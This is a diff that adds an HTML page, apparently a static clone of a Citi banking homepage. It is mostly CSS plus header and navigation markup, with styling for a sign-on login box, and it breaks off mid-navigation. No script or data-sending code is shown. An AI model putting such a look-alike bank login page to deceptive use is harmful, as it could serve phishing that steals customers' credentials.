@@ -1,0 +1,1987 @@
+﻿<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Citi | Banking</title>
+    <style>
+      :root {
+        --container: 1200px;
+        --space-1: 8px;
+        --space-2: 16px;
+        --space-3: 24px;
+        --space-4: 32px;
+        --space-5: 40px;
+        --space-6: 48px;
+        --space-7: 56px;
+        --space-8: 64px;
+        --radius: 8px;
+        --shadow-sm: 0 8px 24px rgba(15, 23, 42, 0.08);
+        --shadow-md: 0 16px 48px rgba(15, 23, 42, 0.12);
+        --text: #111827;
+        --muted: #4b5563;
+        --muted-2: #6b7280;
+        --border: #e5e7eb;
+        --bg-soft: #f4f6f8;
+        --bg-soft-2: #eef3f7;
+        --blue: #056dae;
+        --blue-2: #04208f;
+      }
+
+      * {
+        box-sizing: border-box;
+      }
+
+      html,
+      body {
+        height: 100%;
+      }
+
+      body {
+        margin: 0;
+        font-family: Inter, system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
+        color: var(--text);
+        background: #ffffff;
+        line-height: 1.5;
+      }
+
+      img {
+        max-width: 100%;
+        display: block;
+      }
+
+      a {
+        color: inherit;
+        text-decoration: none;
+      }
+
+      .container {
+        max-width: var(--container);
+        margin: 0 auto;
+        padding: 0 var(--space-2);
+      }
+
+      .sr-only {
+        position: absolute;
+        width: 1px;
+        height: 1px;
+        padding: 0;
+        margin: -1px;
+        overflow: hidden;
+        clip: rect(0, 0, 0, 0);
+        white-space: nowrap;
+        border: 0;
+      }
+
+      .btn {
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        padding: var(--space-2) var(--space-4);
+        border-radius: var(--radius);
+        border: 1px solid transparent;
+        background: var(--blue);
+        color: #ffffff;
+        font-weight: 700;
+        font-size: 14px;
+        letter-spacing: 0.01em;
+        box-shadow: 0 8px 16px rgba(5, 109, 174, 0.18);
+        white-space: nowrap;
+      }
+
+      .btn:active {
+        transform: translateY(1px);
+      }
+
+      .btn--full {
+        width: 100%;
+      }
+
+      .btn--sm {
+        padding: var(--space-2) var(--space-3);
+        font-size: 13px;
+      }
+
+      .link {
+        font-size: 12px;
+        color: var(--blue-2);
+        font-weight: 600;
+        text-decoration: underline;
+        text-underline-offset: 3px;
+      }
+
+      .eyebrow {
+        font-size: 12px;
+        font-weight: 700;
+        letter-spacing: 0.12em;
+        text-transform: uppercase;
+        color: var(--muted-2);
+      }
+
+      .header {
+        background: #ffffff;
+      }
+
+      .topbar {
+        border-bottom: 1px solid #eef1f4;
+      }
+
+      .topbar__inner {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        padding: var(--space-2) 0;
+        gap: var(--space-3);
+      }
+
+      .topbar__left {
+        display: flex;
+        align-items: center;
+        gap: var(--space-3);
+        min-width: 0;
+      }
+
+      .brand-logo {
+        width: 60px;
+        height: 34px;
+        flex: none;
+      }
+
+      .fdic {
+        display: flex;
+        align-items: center;
+        gap: var(--space-2);
+        min-width: 0;
+      }
+
+      .fdic img {
+        height: 22px;
+        width: auto;
+      }
+
+      .topbar__right {
+        display: flex;
+        align-items: center;
+        gap: var(--space-4);
+        flex: none;
+      }
+
+      .utility {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        gap: var(--space-1);
+        font-size: 11px;
+        font-weight: 600;
+        color: #111827;
+        text-transform: uppercase;
+        letter-spacing: 0.06em;
+      }
+
+      .utility img {
+        width: 24px;
+        height: 24px;
+      }
+
+      .nav {
+        background: var(--bg-soft-2);
+        border-bottom: 1px solid #e7edf3;
+      }
+
+      .nav__inner {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        gap: var(--space-3);
+        padding: var(--space-2) 0;
+      }
+
+      .nav__links {
+        display: flex;
+        align-items: center;
+        gap: var(--space-3);
+        flex-wrap: wrap;
+      }
+
+      .nav__link {
+        color: var(--blue-2);
+        font-weight: 600;
+        font-size: 13px;
+        padding: var(--space-1) 0;
+        position: relative;
+      }
+
+      .nav__link.is-active::after {
+        content: "";
+        position: absolute;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        height: 2px;
+        background: var(--blue-2);
+      }
+
+      .nav__help {
+        display: inline-flex;
+        align-items: center;
+        gap: var(--space-2);
+        font-weight: 600;
+        color: var(--blue-2);
+        font-size: 13px;
+        white-space: nowrap;
+      }
+
+      .nav__help img {
+        width: 22px;
+        height: 22px;
+      }
+
+      .nav__toggle {
+        position: absolute;
+        left: -9999px;
+      }
+
+      .nav__toggle-btn {
+        width: 48px;
+        height: 48px;
+        border-radius: var(--radius);
+        border: 2px solid #d6a23a;
+        background: #ffffff;
+        display: none;
+        align-items: center;
+        justify-content: center;
+        flex: none;
+      }
+
+      .nav__toggle-lines {
+        width: 22px;
+        height: 2px;
+        background: var(--blue-2);
+        position: relative;
+        border-radius: 999px;
+        transition: background 140ms ease;
+      }
+
+      .nav__toggle-lines::before,
+      .nav__toggle-lines::after {
+        content: "";
+        position: absolute;
+        left: 0;
+        width: 22px;
+        height: 2px;
+        background: var(--blue-2);
+        border-radius: 999px;
+        transition: transform 160ms ease, top 160ms ease, background 140ms ease;
+      }
+
+      .nav__toggle-lines::before {
+        top: -7px;
+      }
+
+      .nav__toggle-lines::after {
+        top: 7px;
+      }
+
+      .nav__actions {
+        display: flex;
+        align-items: center;
+        gap: var(--space-2);
+      }
+
+      .nav__divider {
+        width: 1px;
+        height: 24px;
+        background: #c9d5e1;
+        display: none;
+      }
+
+      .nav__signon {
+        display: none;
+        color: var(--blue-2);
+        font-weight: 600;
+        font-size: 14px;
+        white-space: nowrap;
+      }
+
+      .nav__drawer {
+        display: none;
+      }
+
+      .drawer__item,
+      .drawer__utility {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        padding: var(--space-3) var(--space-2);
+        border-bottom: 1px solid #eef1f4;
+        color: var(--blue-2);
+        font-weight: 700;
+        font-size: 16px;
+        background: #ffffff;
+      }
+
+      .drawer__chev {
+        font-size: 22px;
+        line-height: 1;
+      }
+
+      .drawer__utility {
+        justify-content: flex-start;
+        gap: var(--space-2);
+        font-size: 14px;
+        color: #374151;
+        font-weight: 600;
+        letter-spacing: 0.06em;
+        text-transform: uppercase;
+      }
+
+      .drawer__utility img {
+        width: 24px;
+        height: 24px;
+        opacity: 0.9;
+      }
+
+      .nav__toggle:checked + .nav__inner .nav__toggle-btn {
+        background: var(--blue-2);
+      }
+
+      .nav__toggle:checked + .nav__inner .nav__toggle-lines {
+        background: transparent;
+      }
+
+      .nav__toggle:checked + .nav__inner .nav__toggle-lines::before {
+        top: 0;
+        transform: rotate(45deg);
+        background: #ffffff;
+      }
+
+      .nav__toggle:checked + .nav__inner .nav__toggle-lines::after {
+        top: 0;
+        transform: rotate(-45deg);
+        background: #ffffff;
+      }
+
+      .notice {
+        background: #ffffff;
+        padding: var(--space-2) 0;
+      }
+
+      .notice__inner {
+        display: flex;
+        align-items: flex-start;
+        gap: var(--space-2);
+        padding: var(--space-2);
+        border: 1px solid var(--border);
+        border-radius: var(--radius);
+        background: #f6f7f9;
+      }
+
+      .notice__icon {
+        width: 24px;
+        height: 24px;
+        border-radius: 999px;
+        background: #111827;
+        color: #ffffff;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-weight: 900;
+        font-size: 13px;
+        flex: none;
+      }
+
+      .notice__text {
+        font-size: 13px;
+        color: #374151;
+        flex: 1;
+        min-width: 0;
+      }
+
+      .notice__text a {
+        color: var(--blue-2);
+        font-weight: 600;
+        text-decoration: underline;
+        text-underline-offset: 3px;
+        white-space: nowrap;
+      }
+
+      .notice__close {
+        width: 32px;
+        height: 32px;
+        border-radius: var(--radius);
+        border: 1px solid #e6e9ee;
+        background: #ffffff;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        color: #6b7280;
+        font-size: 18px;
+        line-height: 1;
+        flex: none;
+        cursor: default;
+      }
+
+      .hero {
+        background: #f7f8fa url("images/23_31.png") center / cover no-repeat;
+        padding: var(--space-6) 0 var(--space-6);
+      }
+
+      .hero__inner {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        gap: var(--space-4);
+      }
+
+      .hero__copy {
+        flex: 1 1 380px;
+        max-width: 440px;
+      }
+
+      .hero__copy .eyebrow {
+        margin-bottom: var(--space-2);
+      }
+
+      .hero__title {
+        margin: 0 0 var(--space-2);
+        font-size: 44px;
+        line-height: 1.08;
+        letter-spacing: -0.02em;
+      }
+
+      .hero__desc {
+        margin: 0 0 var(--space-3);
+        color: var(--muted);
+        font-size: 14px;
+        max-width: 360px;
+      }
+
+      .hero__cards {
+        flex: 0 0 360px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+
+      .hero__cards img {
+        width: 360px;
+        height: auto;
+        filter: drop-shadow(0 16px 32px rgba(15, 23, 42, 0.12));
+      }
+
+      .hero__login {
+        flex: 0 0 380px;
+        display: flex;
+        justify-content: flex-end;
+      }
+
+      .login {
+        width: 100%;
+        max-width: 380px;
+        background: #ffffff;
+        border: 1px solid #e6e9ee;
+        border-radius: var(--radius);
+        box-shadow: var(--shadow-md);
+        overflow: hidden;
+      }
+
+      .login__body {
+        padding: var(--space-3);
+      }
+
+      .login__fields {
+        display: flex;
+        gap: var(--space-2);
+        margin-bottom: var(--space-2);
+      }
+
+      .field {
+        flex: 1;
+        min-width: 0;
+      }
+
+      .field label {
+        display: block;
+        font-size: 12px;
+        font-weight: 700;
+        color: #374151;
+        margin-bottom: var(--space-1);
+      }
+
+      .input {
+        width: 100%;
+        border: 1px solid #d7dce4;
+        border-radius: var(--radius);
+        padding: var(--space-2);
+        font-size: 13px;
+        outline: none;
+        background: #ffffff;
+      }
+
+      .input::placeholder {
+        color: #9ca3af;
+      }
+
+      .input-wrap {
+        position: relative;
+      }
+
+      .input-wrap .input {
+        padding-right: var(--space-6);
+      }
+
+      .reveal-toggle {
+        position: absolute;
+        right: var(--space-2);
+        top: 50%;
+        transform: translateY(-50%);
+        width: 18px;
+        height: 18px;
+        opacity: 0;
+        margin: 0;
+        z-index: 2;
+      }
+
+      .input--secret {
+        -webkit-text-security: disc;
+        -moz-text-security: disc;
+        text-security: disc;
+      }
+
+      .reveal-toggle:checked ~ .input--secret {
+        -webkit-text-security: none;
+        -moz-text-security: none;
+        text-security: none;
+      }
+
+      .input-eye {
+        position: absolute;
+        right: var(--space-2);
+        top: 50%;
+        transform: translateY(-50%);
+        width: 18px;
+        height: 18px;
+        background: url("images/36_68.svg") center / contain no-repeat;
+        opacity: 0.95;
+        cursor: pointer;
+        z-index: 3;
+      }
+
+      .input-eye::after {
+        content: "";
+        position: absolute;
+        left: -2px;
+        right: -2px;
+        top: 50%;
+        height: 2px;
+        background: rgba(17, 24, 39, 0.7);
+        transform: translateY(-50%) rotate(-45deg);
+        border-radius: 999px;
+        opacity: 0;
+      }
+
+      .reveal-toggle:checked ~ .input-eye::after {
+        opacity: 1;
+      }
+
+      .check {
+        display: flex;
+        align-items: center;
+        gap: var(--space-1);
+        margin: var(--space-1) 0 var(--space-2);
+        font-size: 12px;
+        color: #374151;
+        font-weight: 600;
+      }
+
+      .check input {
+        width: 14px;
+        height: 14px;
+        margin: 0;
+        border-radius: 4px;
+      }
+
+      .login__links {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        gap: var(--space-2);
+        margin-top: var(--space-2);
+        font-size: 12px;
+        font-weight: 600;
+      }
+
+      .login__links a {
+        color: var(--blue-2);
+        text-decoration: underline;
+        text-underline-offset: 3px;
+        white-space: nowrap;
+      }
+
+      .login__alt {
+        border-top: 1px solid #e7edf3;
+        background: #f2f6f9;
+        padding: var(--space-2) var(--space-3);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: var(--space-2);
+        font-weight: 700;
+        color: var(--blue-2);
+        font-size: 13px;
+      }
+
+      .login__alt img {
+        width: 22px;
+        height: 22px;
+      }
+
+      .modal {
+        position: fixed;
+        inset: 0;
+        display: none;
+        align-items: flex-start;
+        justify-content: center;
+        padding: var(--space-5) var(--space-2);
+        background: rgba(17, 24, 39, 0.56);
+        z-index: 50;
+        overflow: auto;
+      }
+
+      .modal:target {
+        display: flex;
+      }
+
+      .modal__backdrop {
+        position: absolute;
+        inset: 0;
+      }
+
+      .modal__dialog {
+        position: relative;
+        width: 100%;
+        max-width: 420px;
+        display: flex;
+        flex-direction: column;
+        align-items: stretch;
+        gap: var(--space-2);
+        z-index: 1;
+      }
+
+      .modal__close {
+        align-self: flex-end;
+        width: 40px;
+        height: 40px;
+        border-radius: var(--radius);
+        border: 1px solid #e6e9ee;
+        background: #ffffff;
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        color: #6b7280;
+        font-size: 22px;
+        line-height: 1;
+        box-shadow: var(--shadow-sm);
+      }
+
+      .feature-row {
+        background: #ffffff;
+        padding: 0 0 var(--space-6);
+      }
+
+      .feature-row__card {
+        margin-top: calc(var(--space-4) * -1);
+        background: #ffffff;
+        border: 1px solid #eef1f4;
+        border-radius: var(--radius);
+        box-shadow: var(--shadow-sm);
+        padding: var(--space-3) var(--space-4);
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        gap: var(--space-3);
+      }
+
+      .feature {
+        flex: 1;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        gap: var(--space-2);
+        color: var(--blue-2);
+        font-weight: 700;
+        font-size: 12px;
+        text-align: center;
+        min-width: 120px;
+      }
+
+      .feature img {
+        width: 44px;
+        height: 44px;
+      }
+
+      .section {
+        padding: var(--space-6) 0;
+      }
+
+      .cards-grid {
+        display: grid;
+        grid-template-columns: repeat(3, 1fr);
+        gap: var(--space-3);
+      }
+
+      .card {
+        background: #ffffff;
+        border: 1px solid var(--border);
+        border-radius: var(--radius);
+        box-shadow: 0 8px 24px rgba(15, 23, 42, 0.05);
+        padding: var(--space-3);
+        display: flex;
+        flex-direction: column;
+        min-height: 460px;
+      }
+
+      .card__tag {
+        font-size: 11px;
+        letter-spacing: 0.12em;
+        font-weight: 900;
+        color: var(--muted-2);
+        text-transform: uppercase;
+        margin-bottom: var(--space-2);
+      }
+
+      .card__media {
+        border-radius: var(--radius);
+        height: 168px;
+        background: #eef1f4;
+        overflow: hidden;
+        position: relative;
+        margin-bottom: var(--space-3);
+      }
+
+      .card__media--diamond {
+        background-image: url("images/32_20-56586a.png");
+        background-size: 200% 200%;
+        background-position: 100% 0%;
+        background-repeat: no-repeat;
+      }
+
+      .card__media--aa {
+        background-image: url("images/32_20-56586a.png");
+        background-size: 200% 200%;
+        background-position: 100% 100%;
+        background-repeat: no-repeat;
+      }
+
+      .card__media--bonus {
+        background: linear-gradient(135deg, #1740cb 0%, #0b5ed7 45%, #0b5ed7 100%);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        border: 1px solid rgba(255, 255, 255, 0.12);
+      }
+
+      .bonus {
+        width: calc(100% - var(--space-4));
+        height: calc(100% - var(--space-4));
+        border-radius: var(--radius);
+        background: rgba(255, 255, 255, 0.06);
+        border: 1px solid rgba(255, 255, 255, 0.18);
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        gap: var(--space-1);
+        color: #ffffff;
+        text-align: center;
+      }
+
+      .bonus__kicker {
+        font-size: 12px;
+        font-weight: 700;
+        opacity: 0.92;
+      }
+
+      .bonus__amount {
+        font-size: 64px;
+        font-weight: 900;
+        line-height: 1;
+        letter-spacing: -0.03em;
+      }
+
+      .bonus__label {
+        font-size: 14px;
+        font-weight: 700;
+        opacity: 0.92;
+      }
+
+      .card__title {
+        margin: 0 0 var(--space-2);
+        font-size: 18px;
+        line-height: 1.25;
+        letter-spacing: -0.01em;
+      }
+
+      .card__desc {
+        margin: 0 0 var(--space-3);
+        color: var(--muted);
+        font-size: 13px;
+      }
+
+      .card__actions {
+        margin-top: auto;
+        display: flex;
+        align-items: center;
+        gap: var(--space-2);
+        flex-wrap: wrap;
+      }
+
+      .banner {
+        padding: var(--space-8) 0;
+      }
+
+      .banner--blue {
+        background: #cfeaf9;
+      }
+
+      .banner--soft {
+        background: var(--bg-soft);
+      }
+
+      .banner__inner {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        gap: var(--space-6);
+      }
+
+      .banner__media {
+        flex: 0 0 560px;
+        height: 240px;
+        border-radius: var(--radius);
+        position: relative;
+        overflow: hidden;
+        box-shadow: var(--shadow-sm);
+      }
+
+      .banner__media--choose {
+        background: radial-gradient(120% 120% at 15% 40%, rgba(255, 255, 255, 0.16) 0%, rgba(255, 255, 255, 0) 58%),
+          radial-gradient(120% 120% at 78% 22%, rgba(255, 255, 255, 0.16) 0%, rgba(255, 255, 255, 0) 62%),
+          linear-gradient(135deg, #686b71 0%, #8a8f98 100%);
+      }
+
+      .banner__media--choose::after {
+        content: "";
+        position: absolute;
+        inset: -20%;
+        background: radial-gradient(circle at 60% 30%, rgba(255, 255, 255, 0.35), rgba(255, 255, 255, 0) 56%),
+          repeating-linear-gradient(135deg, rgba(255, 255, 255, 0.18) 0, rgba(255, 255, 255, 0.18) 2px, rgba(255, 255, 255, 0) 2px, rgba(255, 255, 255, 0) 14px);
+        opacity: 0.12;
+        transform: rotate(-12deg);
+      }
+
+      .banner__media--choose img {
+        position: absolute;
+        left: var(--space-4);
+        top: 50%;
+        transform: translateY(-50%);
+        width: 360px;
+        filter: drop-shadow(0 18px 28px rgba(15, 23, 42, 0.26));
+      }
+
+      .banner__copy {
+        flex: 1;
+        max-width: 520px;
+      }
+
+      .banner__copy .eyebrow {
+        margin-bottom: var(--space-2);
+      }
+
+      .banner__title {
+        margin: 0 0 var(--space-2);
+        font-size: 34px;
+        line-height: 1.15;
+        letter-spacing: -0.02em;
+      }
+
+      .banner__desc {
+        margin: 0 0 var(--space-3);
+        color: var(--muted);
+        font-size: 14px;
+        max-width: 480px;
+      }
+
+      .banner__inner--reverse {
+        flex-direction: row-reverse;
+      }
+
+      .banner__media--cash {
+        background: radial-gradient(80% 100% at 70% 20%, rgba(255, 255, 255, 0.18) 0%, rgba(255, 255, 255, 0) 55%),
+          linear-gradient(135deg, #0b54b6 0%, #0b7bb9 45%, #0a2f8f 100%);
+      }
+
+      .cash-card {
+        position: absolute;
+        right: var(--space-4);
+        top: 50%;
+        transform: translateY(-50%) rotate(-10deg);
+        width: 300px;
+        height: 188px;
+        border-radius: var(--radius);
+        background: linear-gradient(135deg, rgba(0, 219, 160, 0.2) 0%, rgba(0, 219, 160, 0) 40%),
+          radial-gradient(90% 120% at 80% 18%, rgba(255, 255, 255, 0.24) 0%, rgba(255, 255, 255, 0) 55%),
+          linear-gradient(135deg, #0d7fd1 0%, #0e4cae 55%, #0b2e7a 100%);
+        box-shadow: 0 24px 48px rgba(0, 0, 0, 0.28);
+        overflow: hidden;
+        border: 1px solid rgba(255, 255, 255, 0.16);
+      }
+
+      .cash-card::before {
+        content: "";
+        position: absolute;
+        inset: 0;
+        background: repeating-linear-gradient(25deg, rgba(255, 255, 255, 0.18) 0, rgba(255, 255, 255, 0.18) 1px, rgba(255, 255, 255, 0) 1px, rgba(255, 255, 255, 0) 10px);
+        opacity: 0.12;
+      }
+
+      .cash-card__brand {
+        position: absolute;
+        left: var(--space-2);
+        top: var(--space-2);
+        font-weight: 900;
+        color: rgba(255, 255, 255, 0.9);
+        letter-spacing: 0.02em;
+        font-size: 14px;
+      }
+
+      .cash-card__name {
+        position: absolute;
+        left: var(--space-2);
+        bottom: var(--space-2);
+        font-size: 12px;
+        font-weight: 700;
+        color: rgba(255, 255, 255, 0.82);
+        letter-spacing: 0.06em;
+        text-transform: uppercase;
+      }
+
+      .info {
+        padding: var(--space-8) 0;
+        background: #ffffff;
+      }
+
+      .info__inner {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        gap: var(--space-6);
+      }
+
+      .info__media {
+        flex: 0 0 520px;
+        border-radius: var(--radius);
+        overflow: hidden;
+        background: #ffffff;
+      }
+
+      .info__media img {
+        width: 520px;
+        height: auto;
+      }
+
+      .info__copy {
+        flex: 1;
+        max-width: 520px;
+      }
+
+      .info__copy .eyebrow {
+        margin-bottom: var(--space-2);
+      }
+
+      .info__title {
+        margin: 0 0 var(--space-2);
+        font-size: 36px;
+        line-height: 1.15;
+        letter-spacing: -0.02em;
+      }
+
+      .info__desc {
+        margin: 0 0 var(--space-3);
+        color: var(--muted);
+        font-size: 14px;
+      }
+
+      .footer {
+        background: #2f2f2f;
+        color: rgba(255, 255, 255, 0.92);
+      }
+
+      .footer__top {
+        padding: var(--space-7) 0 var(--space-6);
+      }
+
+      .footer__grid {
+        display: flex;
+        gap: var(--space-4);
+        align-items: start;
+        flex-wrap: wrap;
+      }
+
+      .footer__grid > div {
+        flex: 1 1 200px;
+        min-width: 160px;
+      }
+
+      .footer-acc {
+        position: relative;
+      }
+
+      .footer-acc__toggle {
+        position: absolute;
+        left: -9999px;
+      }
+
+      .footer-acc__head {
+        margin: 0 0 var(--space-2);
+        display: block;
+        font-size: 12px;
+        font-weight: 700;
+        letter-spacing: 0;
+        text-transform: none;
+        color: rgba(255, 255, 255, 0.92);
+        cursor: default;
+        user-select: none;
+      }
+
+      .footer-acc__icon {
+        display: none;
+      }
+
+      .footer-acc__panel {
+        display: block;
+      }
+
+      .footer__col-title {
+        margin: 0 0 var(--space-2);
+        font-size: 12px;
+        font-weight: 700;
+        letter-spacing: 0;
+        text-transform: none;
+        color: rgba(255, 255, 255, 0.92);
+      }
+
+      .footer__link {
+        display: block;
+        padding: var(--space-1) 0;
+        color: rgba(255, 255, 255, 0.72);
+        font-size: 12px;
+        font-weight: 600;
+      }
+
+      .footer__bottom {
+        border-top: 1px solid rgba(255, 255, 255, 0.12);
+        padding: var(--space-4) 0 var(--space-7);
+      }
+
+      .footer__meta {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        gap: var(--space-4);
+        flex-wrap: wrap;
+        margin-bottom: var(--space-4);
+      }
+
+      .footer__meta-left {
+        display: flex;
+        align-items: center;
+        gap: var(--space-3);
+        flex-wrap: wrap;
+        color: rgba(255, 255, 255, 0.7);
+        font-size: 11px;
+        font-weight: 600;
+      }
+
+      .footer__meta-left a {
+        color: rgba(255, 255, 255, 0.7);
+        text-decoration: underline;
+        text-underline-offset: 3px;
+      }
+
+      .footer__meta-right {
+        display: flex;
+        align-items: center;
+        gap: var(--space-3);
+        flex-wrap: wrap;
+      }
+
+      .footer__badges {
+        display: flex;
+        align-items: center;
+        gap: var(--space-3);
+        flex-wrap: wrap;
+      }
+
+      .store-badge {
+        display: block;
+        width: 119px;
+        height: 40px;
+        border-radius: var(--radius);
+        background-image: url("images/56_185.png");
+        background-repeat: no-repeat;
+        background-size: auto 40px;
+        border: 1px solid rgba(255, 255, 255, 0.16);
+      }
+
+      .store-badge--gp {
+        background-position: left center;
+      }
+
+      .store-badge--as {
+        background-position: right center;
+      }
+
+      .footer__social img {
+        height: 24px;
+        width: auto;
+        opacity: 0.95;
+      }
+
+      .footer__legal {
+        color: rgba(255, 255, 255, 0.66);
+        font-size: 11px;
+        line-height: 1.6;
+      }
+
+      .footer__legal strong {
+        color: rgba(255, 255, 255, 0.92);
+      }
+
+      .footer__logo {
+        margin-top: var(--space-6);
+      }
+
+      .footer__logo img {
+        width: 86px;
+        height: auto;
+        opacity: 0.95;
+      }
+
+      @media (max-width: 1120px) {
+        .hero__inner {
+          gap: var(--space-3);
+        }
+
+        .hero__cards {
+          flex-basis: 320px;
+        }
+
+        .hero__cards img {
+          width: 320px;
+        }
+
+        .hero__login {
+          flex-basis: 360px;
+        }
+
+        .banner__media {
+          flex-basis: 520px;
+        }
+
+        .banner__media--choose img {
+          width: 340px;
+        }
+      }
+
+      @media (max-width: 960px) {
+        .topbar__right {
+          gap: var(--space-3);
+        }
+
+        .utility {
+          display: none;
+        }
+
+        .nav__inner {
+          align-items: center;
+          gap: var(--space-2);
+        }
+
+        .nav__help {
+          font-size: 16px;
+        }
+
+        .nav__help img {
+          width: 24px;
+          height: 24px;
+        }
+
+        .nav__toggle-btn {
+          display: flex;
+        }
+
+        .nav__links {
+          display: none;
+        }
+
+        .nav__actions {
+          flex: 1;
+          justify-content: flex-end;
+          gap: var(--space-3);
+        }
+
+        .nav__divider {
+          display: block;
+        }
+
+        .nav__signon {
+          display: inline-flex;
+        }
+
+        .nav__drawer {
+          display: block;
+          max-height: 0;
+          overflow: hidden;
+          margin: 0 calc(var(--space-2) * -1);
+          transition: max-height 220ms ease;
+        }
+
+        .nav__toggle:checked ~ .nav__drawer {
+          max-height: 720px;
+          box-shadow: var(--shadow-sm);
+        }
+
+        .hero__inner {
+          flex-direction: column;
+          align-items: stretch;
+        }
+
+        .hero__copy {
+          max-width: none;
+          order: 2;
+        }
+
+        .hero__cards {
+          order: 1;
+          flex-basis: auto;
+        }
+
+        .hero__login {
+          display: none;
+        }
+
+        .login__fields {
+          flex-direction: column;
+        }
+
+        .feature-row__card {
+          flex-wrap: wrap;
+          justify-content: center;
+          gap: var(--space-2);
+          padding: var(--space-3);
+        }
+
+        .cards-grid {
+          grid-template-columns: repeat(2, 1fr);
+        }
+
+        .banner__inner {
+          flex-direction: column;
+          align-items: stretch;
+        }
+
+        .banner__inner--reverse {
+          flex-direction: column;
+        }
+
+        .banner__media {
+          flex-basis: auto;
+          width: 100%;
+          max-width: 720px;
+          margin: 0 auto;
+        }
+
+        .banner__copy {
+          max-width: none;
+        }
+
+        .info__inner {
+          flex-direction: column;
+          align-items: stretch;
+        }
+
+        .info__media {
+          flex-basis: auto;
+          width: 100%;
+          max-width: 720px;
+          margin: 0 auto;
+        }
+
+        .info__media img {
+          width: 100%;
+        }
+
+        .footer__grid > div {
+          flex: 1 1 240px;
+        }
+      }
+
+      @media (max-width: 640px) {
+        .hero__title {
+          font-size: 36px;
+        }
+
+        .hero__cards img {
+          width: 300px;
+        }
+
+        .notice__inner {
+          flex-direction: column;
+        }
+
+        .cards-grid {
+          grid-template-columns: 1fr;
+        }
+
+        .card {
+          min-height: auto;
+        }
+
+        .banner {
+          padding: var(--space-7) 0;
+        }
+
+        .banner__title {
+          font-size: 28px;
+        }
+
+        .cash-card {
+          width: 260px;
+          height: 164px;
+          right: var(--space-3);
+        }
+
+        .info__title {
+          font-size: 30px;
+        }
+
+        .footer__grid {
+          flex-direction: column;
+          gap: 0;
+        }
+
+        .footer__grid > div {
+          flex: 1 1 auto;
+          min-width: 0;
+        }
+
+        .footer-acc {
+          border-bottom: 1px solid rgba(255, 255, 255, 0.12);
+        }
+
+        .footer-acc:first-child {
+          border-top: 1px solid rgba(255, 255, 255, 0.12);
+        }
+
+        .footer-acc__head {
+          margin: 0;
+          padding: var(--space-3) 0;
+          display: flex;
+          align-items: center;
+          justify-content: space-between;
+          gap: var(--space-2);
+          font-size: 18px;
+          letter-spacing: 0;
+          text-transform: none;
+          font-weight: 700;
+          cursor: pointer;
+        }
+
+        .footer-acc__icon {
+          display: block;
+          width: 14px;
+          height: 14px;
+          border-right: 2px solid rgba(255, 255, 255, 0.92);
+          border-bottom: 2px solid rgba(255, 255, 255, 0.92);
+          transform: rotate(45deg);
+          transition: transform 180ms ease;
+          flex: none;
+        }
+
+        .footer-acc__panel {
+          max-height: 720px;
+          overflow: hidden;
+          transition: max-height 220ms ease, padding 220ms ease;
+          padding-bottom: var(--space-2);
+        }
+
+        .footer-acc__toggle:not(:checked) + .footer-acc__head + .footer-acc__panel {
+          max-height: 0;
+          padding-bottom: 0;
+        }
+
+        .footer-acc__toggle:checked + .footer-acc__head .footer-acc__icon {
+          transform: rotate(-135deg);
+        }
+
+        .footer__link {
+          padding: var(--space-2) 0;
+          font-size: 14px;
+          color: rgba(255, 255, 255, 0.92);
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <a class="sr-only" href="#main">Skip to content</a>
+
+    <header class="header">
+      <div class="topbar">
+        <div class="container">
+          <div class="topbar__inner">
+            <div class="topbar__left">
+              <img class="brand-logo" src="images/4_19.svg" alt="Citi" />
+              <div class="fdic">
+                <img
+                  src="images/4_17_1.png"
+                  alt="FDIC-Insured - Backed by the full faith and credit of the U.S. Government. Citibank, N.A."
+                />
+              </div>
+            </div>
+            <div class="topbar__right" aria-label="Utilities">
+              <a class="utility" href="#">
+                <img src="images/13_7.svg" alt="" aria-hidden="true" />
+                <span>ATM / BRANCH</span>
+              </a>
+              <a class="utility" href="#">
+                <img src="images/13_2.svg" alt="" aria-hidden="true" />
+                <span>ESPA&#209;OL</span>
+              </a>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="nav">
+        <div class="container">
+          <input class="nav__toggle" type="checkbox" id="navToggle" />
+          <div class="nav__inner">
+            <label class="nav__toggle-btn" for="navToggle" aria-label="Menu">
+              <span class="nav__toggle-lines" aria-hidden="true"></span>
+            </label>
+            <nav class="nav__links" aria-label="Primary">
+              <a class="nav__link is-active" href="#">Credit Cards</a>
+              <a class="nav__link" href="#">Banking</a>
+              <a class="nav__link" href="#">Lending</a>
+              <a class="nav__link" href="#">Investing</a>
+              <a class="nav__link" href="#">Wealth Management</a>
+              <a class="nav__link" href="#">Open an Account &#8250;</a>
+            </nav>
+            <div class="nav__actions" aria-label="Search and sign on">
+              <a class="nav__help" href="#">
+                <img src="images/16_25.svg" alt="" aria-hidden="true" />
+                <span>How can we help?</span>
+              </a>
+              <span class="nav__divider" aria-hidden="true"></span>
+              <a class="nav__signon" href="#signon" aria-haspopup="dialog">Sign On</a>
+            </div>
+          </div>
+
+          <div class="nav__drawer" role="region" aria-label="Navigation menu">
+            <a class="drawer__item" href="#">
+              <span>Credit Cards</span>
+              <span class="drawer__chev" aria-hidden="true">&#8250;</span>
+            </a>
+            <a class="drawer__item" href="#">
+              <span>Banking</span>
